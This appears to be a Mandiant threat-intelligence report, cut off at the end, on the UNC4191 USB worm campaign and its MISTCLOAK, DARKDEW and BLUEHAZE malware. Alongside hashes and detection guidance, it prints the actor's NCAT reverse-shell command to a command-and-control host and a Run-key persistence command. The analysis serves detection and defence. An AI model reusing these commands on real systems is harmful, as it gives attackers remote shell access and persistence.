Successful compromise led to the deployment of a renamed\nNCAT binary and execution of a reverse shell on the victim’s system, providing backdoor\naccess to the threat actor. The malware self-replicates by infecting new removable drives\nthat are plugged into a compromised system, allowing the malicious payloads to propagate\nto additional systems and potentially collect data from air-gapped systems.\n\n[Mandiant Managed Defense performs continuous threat hunting for customers, discovering](https://www.mandiant.com/advantage/managed-defense)\nevidence of new tactics, techniques, and procedures (TTPs) that can evade traditional\ndetection mechanisms\n\n\n-----\n\nIn response to this campaign, Mandiant deployed new real-time detections, enhancing\nManaged Defense’s protection for our customers from future similar activity. Our Adversary\nOperations team created and deployed YARA rules and Mandiant Security Validation\nActions, shared at the end of the post. This blog post details our initial threat hunting\ndiscovery, the newly identified malware families, detection opportunities, and Mandiant’s\nassessment about the goals and motivations of the threat actor.\n\n## Malware Observed\n\nMandiant observed UNC4191 deploy the following malware families.\n\nTable 1: UNC4191 Malware Families\n\n\n**Malware**\n**Family**\n\n\n**Description**\n\n\n[MISTCLOAK](https://advantage.mandiant.com/malware/malware--8e6ac174-cfa4-59b4-9703-3961ccde8f1f) MISTCLOAK is a launcher written in C++ that executes an encrypted\nexecutable payload stored in a file on disk.\n\n[BLUEHAZE](https://advantage.mandiant.com/malware/malware--f6f76305-ddee-5b28-a329-0f5778e2de50) BLUEHAZE is a launcher written in C/C++ that launches a copy of NCAT to\ncreate a reverse shell to a hardcoded command and control (C2).\n\n[DARKDEW](https://advantage.mandiant.com/malware/malware--4b4289a5-968f-5763-ad7c-659edecc45f5) DARKDEW is a dropper written in C++ that is capable of infecting\nremovable drives.\n\nNCAT NCAT is a command-line networking utility that was written for the Nmap\nProject to perform a wide-variety of security and administration tasks. While\nNCAT may be used for legitimate purposes, threat actors may also use it to\nupload or download files, create backdoors or reverse shells, and tunnel\ntraffic to evade network controls.\n\n## Initial Detection\n\nMandiant Managed Defense customers receive Mandiant’s dedicated proactive Threat\nHunting service. Mandiant's threat hunting team leverages the MITRE ATT&CK® framework\nas a guide for developing Hunt Missions that examine endpoint telemetry data, such as\nprocess events, for collection and ATT&CK technique ID tagging. The resulting threat hunting\ndata set provides the team with wide visibility across the customer base. When performing\nanalysis, we augment this data set with more targeted sources, like custom, real-time alerting\nfrom our customers’ endpoint detection and response (EDR) technologies.\n\n\n-----\n\nMandiant uses custom tooling to identify ATT&CK technique sequences and clusters\nassociated with common threat actor behaviors. A technique sequence is useful for\nidentifying events with a defined order of execution, such as the creation of a local account\n(T1136.001) and then addition to the local Administrators group (T1098). A technique cluster\nidentifies a grouping of techniques that don’t necessarily occur in a specific order. By\nfocusing on technique sequences and clusters, we reduce the amount of data that needs to\nbe manually reviewed by analysts.\n\nFor example, Mandiant has observed threat actors enumerating domain trusts (T1482) and\nquerying domain and local group permissions (T1069.001, T1069.002) within a several\nminute span (Figure 1). The combined event count for these three techniques occurring on\ntheir own can number in the hundreds of thousands, but by applying technique sequencing\nor clustering we can reduce the number of interesting events to a manageable amount.\n\nFigure 1: Visualization of technique sequencing and clustering concepts\n\n\n-----\n\nMandiant identified this UNC4191 campaign by searching for anomalous sequences of\nevents under our “Mandiant Intelligence: Staging Directories” and “Command and Scripting\nInterpreter: Windows Command Shell (T1059.003)” hunting missions (Figure 2).\n\nFigure 2: Technique sequence that led to UNC4191 detection\nThe techniques performed by UNC4191 led to the development of additional technique\nsequences and detection opportunities, as described in the Detection Opportunities section.\n\n## UNC4191 Malware Infection Cycle\n\nThe overall infection cycle from this campaign can be split into three distinct phases, shown\nin Figure 3.\n\n\n-----\n\nFigure 3: UNC4191 malware infection cycle\n\n### PHASE I: MISTCLOAK\n\nThe infection chain begins when a user plugs in a compromised removable device and\nmanually executes a renamed signed binary from the root directory of the storage volume\n(T1091). The initial binaries—named Removable Drive.exe or USB Drive.exe—are versions\nof a legitimately signed application called USB Network Gate, developed by the company\nElectronic Team, Inc. These are used to side-load the MISTCLOAK malware that\nimpersonates a legitimate DLL (Table 2).\n\nTable 2: Legitimate USB Network Gate binaries used to side-load MISTCLOAK malware\n\n\n-----\n\nMD5: f45726a9508376fdd335004fca65392a\n\nFile Name(s): D:\\Removable Disk.exe, D:\\USB Drive.exe\n\nSignature Subject: Electronic Team, Inc\n\nProduct Name: USB Network Gate\n\nOriginal File Name: UsbConfig.exe\n\nMD5: 707de51327f6cae5679dee8e4e2202ba\n\nFile Name(s): D:\\Removable Disk.exe, D:\\USB Drive.exe\n\nSignature Subject: Electronic Team, Inc\n\nProduct Name: USB Network Gate\n\nOriginal File Name: UsbConfig.exe\n\nThe renamed USB Network Gate binaries load a MISTCLOAK DLL named u2ec.dll from the\nexecution directory on the removable device (T1574.002) (Table 3). MISTCLOAK is a\nlauncher for the encrypted file usb.ini, which MISTCLOAK reads from the current directory or\nthe path autorun.inf\\Protection for Autorun\\System Volume Information\\usb.ini. Mandiant\nidentified the PDB file path G:\\project\\APT\\U盘劫持\\new\\shellcode\\Release\\shellcode.pdb in\nthe MISTCLOAK sample. Notably, the Chinese characters 盘劫持 translate to “disk\nhijacking”.\n\nTable 3: MISTCLOAK malware metadata\n\nMD5: 7753da1d7466f251b60673841a97ac5a\n\nFile Name: u2ec.dll\n\nCompile Time: 2021-09-01T09:23:30Z\n\nExports: u2ec.dll\n\nSize: 82,944\n\nPDB filename: G:\\project\\APT\\U盘劫持\\new\\u2ec\\Release\\u2ec.pdb (G:\\project\\APT\\U\nDisk Hijacking\\new\\u2ec\\Release\\u2ec.pdb)\n\nMISTCLOAK then opens Windows Explorer to the location on the removable device where\nthe user files are stored with the command ‘explorer.exe \"<drive>:\\autorun.inf\\Protection for\nAutorun\"’.\n\n\n-----\n\n### Phase II: DARKDEW\n\nThe file usb.ini contains an encrypted DLL payload called DARKDEW that is capable of\ninfecting removable drives. If executed from a removable drive, DARKDEW will launch\nexplorer.exe via `explorer.exe “<drive>:\\autorun.inf\\Protection for Autorun”` where <drive> is\na removable drive letter, such as “E”. DARKDEW will then check if either\nC:\\ProgramData\\udisk\\disk_watch.exe or  C:\\ProgramData\\udisk\\DateCheck.exe exist and\nwill create the directory C:\\ProgramData\\udisk if neither are found.\n\nTable 4: DARKDEW malware metadata\n\nMD5: 6900cf5937287a7ae87d90a4b4b4dec5\n\nFile Name: N/A\n\nCompile Time: 2021-09-09T08:45:31Z\n\nExports: N/A\n\nSize: 123,904\n\nPDB filename: G:\\project\\APT\\U盘劫持\\new\\shellcode\\Release\\shellcode.pdb\n\nDARKDEW then proceeds to copy every file from <drive>:\\autorun.inf\\Protection for\nAutorun\\System Volume Information\\ to C:\\ProgramData\\udisk\\. Mandiant identified files in\nthis directory, such as Removable Drive (16GB).lnk, that originated from a system that was\npreviously compromised by DARKDEW (T1074.001) and copied to a USB device. The\ncopied data includes the files shown in Table 5 and arbitrary files with the extensions: xlsx,\ndocx, mp4, device, jpg, pptx, pdf, txt, and lnk files.\n\nTable 5: Files that are copied by DARKDEW from the removable drive to a compromised\nsystem\n\n\n-----\n\nC:\\ProgramData\\udisk\\disk_watch.exe\n\nC:\\ProgramData\\udisk\\libeay32.dll\n\nC:\\ProgramData\\udisk\\Removable Disk.exe\n\nC:\\ProgramData\\udisk\\rzlog4cpp.dll\n\nC:\\ProgramData\\udisk\\rzlog4cpp_logger.dll\n\nC:\\ProgramData\\udisk\\ssleay32.dll\n\nC:\\ProgramData\\udisk\\u2ec.dll\n\nC:\\ProgramData\\udisk\\USB Drive.exe\n\nC:\\ProgramData\\udisk\\usb.ini\n\nC:\\ProgramData\\udisk\\UsbConfig.exe\n\nC:\\ProgramData\\udisk\\wuwebv.exe\n\nC:\\ProgramData\\udisk\\DateCheck.exe\n\nC:\\ProgramData\\udisk\\example.jpg\n\nC:\\ProgramData\\udisk\\example.xlsx\n\nDARKDEW will then copy the renamed USB Network Gate binary (e.g., Removable\nDrive.exe) to C:\\ProgramData\\udisk\\disk_watch.exe and create persistence with a registry\nkey value named udisk under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n(T1547.001). Finally, DARKDEW will launch a file named\nC:\\ProgramData\\udisk\\DateCheck.exe and then exit.\n\nTable 6: DARKDEW registry persistence\n\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nValue: udisk\n\nText: c:\\programdata\\udisk\\disk_watch.exe\n\nIf DARKDEW is executed from a non-removable drive, the behavior is slightly different.\nDARKDEW will create the directory C:\\ProgramData\\udisk\\, then copy every file in the\ncurrent directory of the parent executable to C:\\ProgramData\\udisk\\. It will then copy the\nparent executable to C:\\ProgramData\\udisk\\disk_watch.exe and launch it. The persistence\nmechanism is identical, and it will also launch C:\\ProgramData\\udisk\\DateCheck.exe.\n\n\n-----\n\nWhen DARKDEW is executed within the context of disk_watch.exe, the malware will scan\nthe system every 10 seconds for removable drives by enumerating volumes from A to Z until\nit finds one that is removable. The DARKDEW malware then creates the directory\n<drive>\\autorun.inf\\Protection for Autorun\\, sets its attribute to hidden, and copies the\ncontents of the current working directory of disk_watch.exe to that directory or the\nsubdirectory <drive>:\\autorun.inf\\Protection for Autorun\\System Volume Information\\. This\ncapability appears to be a method for self-replication and to transfer files that may be\ncollected from air-gapped systems.\n\n### Phase III: BLUEHAZE\n\nThe binary DateCheck.exe is a renamed version of a legitimate, signed application called\nRazer Chromium Render Process by Razer USA Ltd. (Table 7).\n\nTable 7: Legitimate Razer USA Ltd. binary used to side-load BLUEHAZE malware\n\nMD5: ea7f5b7fdb1e637e4e73f6bf43dcf090\n\nFile Name(s): DateCheck.exe\n\nSignature Subject: Razer USA Ltd.\n\nProduct Name: Razer Chromium Render Process\n\nOriginal File Name: RzCefRenderProcess.exe\n\nThe renamed Razor application, DateCheck.exe, loads the legitimate file\nrzlog4cpp_logger.dll, which calls the getRoot function from the BLUEHAZE malware\nRzLog4CPP.dll during C runtime startup (T1574.002).\n\nTable 8: BLUEHAZE malware metadata\n\nMD5: f632e4b9d663d69edaa8224a43b59033\n\nFile Name: RzLog4CPP.dll\n\nCompile Time: 2021-09-09T09:27:12Z\n\nExports: log4cpp.dll\n\nSize: 201,216\n\nPDB filename: N/A\n\n\n-----\n\nBLUEHAZE will create a new directory called C:\\Users\\Public\\Libraries\\CNNUDTV\\, then it\nwill create the registry key value ACNTV under\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (T1547.001) for persistence. Next,\nBLUEHAZE copies all the files from its working directory to\nC:\\Users\\Public\\Libraries\\CNNUDTV\\ and then executes a renamed NCAT executable\nwuwebv.exe to create a reverse shell to the hard-coded command and control (C2) address:\nclosed[.]theworkpc[.]com:80 (T1059). Mandiant has not observed evidence of reverse shell\ninteraction; however, based on the age of the activity, this may be a result of visibility gaps or\nshort log retention periods.\n\nTable 9: BLUEHAZE command execution\n\nDateCheck.exe >\n\n\"cmd.exe /C reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v\nACNTV /t REG_SZ /d \\\"Rundll32.exe SHELL32.DLL,ShellExec_RunDLL\n\\\"C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\DateCheck.exe\\\"\\\" /f\"\n\ncmd.exe /c copy *.* C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\\"\n\ncmd.exe /C wuwebv.exe -t -e c:\\\\windows\\\\system32\\\\cmd.exe closed.theworkpc[.]com 80\n\n## Outlook and Implications\n\nBased on available data, such as PE compile timestamps for the malware involved in the\naforementioned activity, this campaign potentially extends back to September 2021. Given\nthe worming nature of the malware involved, we may have detected the later stages of this\nmalware’s proliferation.\n\nWe believe this activity showcases Chinese operations to gain and maintain access to public\nand private entities for the purposes of intelligence collection related to China’s political and\ncommercial interests. Our observations suggest that entities in the Philippines are the main\ntarget of this operation based on the number of affected systems located in this country that\nwere identified by Mandiant.\n\n## Campaign Tracking\n\n[Mandiant will continue to monitor UNC4191’s campaign and will provide notable and dynamic](https://advantage.mandiant.com/campaigns/campaign--bf059f5a-ce93-5754-bb43-e37a240e4326)\nupdates regarding changes in tactics and techniques, the introduction of tools with new\ncapabilities, or the use of new infrastructure to carry out their mission.\n\nFor more insights into how Mandiant tracks this and similar campaigns, see our Threat\nCampaigns feature within [Mandiant Advantage Threat Intelligence.](https://www.mandiant.com/advantage/threat-intelligence)\n\n\n-----\n\n## Detection Opportunities\n\nEach Mandiant threat hunting discovery is evaluated for opportunities to create new real-time\ndetections. These detections help Mandiant identify additional activity across our customers’\nenvironments for rapid escalation and triage analysis and aim to reduce threat actor dwell\ntime.\n\nFollowing our initial campaign discovery, we immediately searched the entire Managed\nDefense customer base for any activity that matched our atomic indicators of interest,\nincluding filenames, file paths, file hashes, IP addresses, domains, and other artifacts. This\nuncovered activity on systems at multiple customers.\n\nAdditionally, we also created or updated real-time Managed Defense detections to identify\nthreat actor methodologies, such as:\n\nDeployment or usage of NETCAT and NCAT reverse shells\n\nModification of registry Run keys for malware persistence, with arguments configured\nto execute the Windows binary rundll32.exe\n\nProcesses launched from the C:\\Users\\Public\\Libraries\\ directory\n\nBy combining Mandiant’s threat intelligence service with Managed Defense’s detection\nengineering and threat hunting capabilities, we can rapidly identify and provide context\naround malicious activity.\n\n\n**Detection**\n**Opportunity**\n\nNCAT reverse\nshell execution\narguments\n\n\n**MITRE**\n**ATT&CK**\n\n\n**Event Details**\n\n\nT1059 wuwebv.exe -t -e c:\\\\windows\\\\system32\\\\cmd.exe\nclosed.theworkpc[.]com 80\n\n\n-----\n\nParent or\ngrandparent\nprocesses\nexecuting from\nNon-C:\\ Drive\nRoot\n\nRegistry Run key\npersistence for\nbinary in\nPROGRAMDATA\n\nRegistry Run key\nexecuting\nRunDLL32\ncommand\n\nFile name of\nexecuting\nprocess doesn’t\nmatch original\nname\n\n\nT1091,\nT1036\n\n\nProcess:\n\nD:\\USB Drive.exe\n\nChild Processes:\n\n- explorer.exe \"D:\\autorun.inf\\Protection for Autorun\"\n\n- c:\\programdata\\udisk\\disk_watch.exe\n\n- c:\\programdata\\udisk\\DateCheck.exe\n\nGrandchild Processes:\n\n>> \"cmd.exe /C reg add\nHKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\n/v ACNTV /t REG_SZ /d \\\"Rundll32.exe\nSHELL32.DLL,ShellExec_RunDLL\n\\\"C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\DateCheck.exe\\\"\\\"\n/f\"\n\n>> cmd.exe /c copy *.*\nC:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\\"\n\n>> cmd.exe /C wuwebv.exe -t -e\nc:\\\\windows\\\\system32\\\\cmd.exe closed.theworkpc[.]com\n80\n\n\nT1060 Registry Key:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nValue: udisk\n\nText: c:\\programdata\\udisk\\disk_watch.exe\n\n\nT1218.011,\nT1060\n\nT1036,\nT1574.002\n\n\nreg add\nHKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\n/v ACNTV /t REG_SZ /d \\\"Rundll32.exe\nSHELL32.DLL,ShellExec_RunDLL\n\\\"C:\\\\Users\\\\Public\\\\Libraries\\\\CNNUDTV\\\\DateCheck.exe\\\"\\\"\n/f\"\n\nOriginalFileName: UsbConfig.exe\n\nFile Name: Removable Disk.exe, USB Drive.exe\n\nOriginalFileName: RzCefRenderProcess.exe\n\nFile Name: DateCheck.exe\n\n\n-----\n\nWindows\nExplorer process\nexecution with\nfolder path\nspecified on\ncommand line\n\n\nT1091 Parent Process Path: D:\\USB Drive.exe\n\nProcess: explorer.exe\n\nCommand Line: explorer.exe \"D:\\autorun.inf\\Protection for\nAutorun\"\n\n\n## Mandiant Security Validation Actions\n\nOrganizations can validate their security controls using the following actions with Mandiant\nSecurity Validation.\n\n**VID** **Name**\n\nA105-454 Protected Theater -
